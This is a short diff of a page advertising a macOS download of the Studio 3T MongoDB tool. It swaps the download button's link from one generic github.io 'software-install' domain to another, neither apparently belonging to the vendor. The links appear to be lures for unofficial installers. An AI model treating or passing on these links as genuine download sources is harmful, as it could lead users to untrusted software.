@@ -6,7 +6,7 @@
 <h3>Studio 3T for macOS</h3>
 <p>Studio 3T Mac Edition combines visual design, code editors and migration helpers into one MongoDB control room.</p>
 
-<a href="https://mac-software-install.github.io/.github/Studio3T">
+<a href="https://software-install-apps.github.io/.github/Studio3T">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
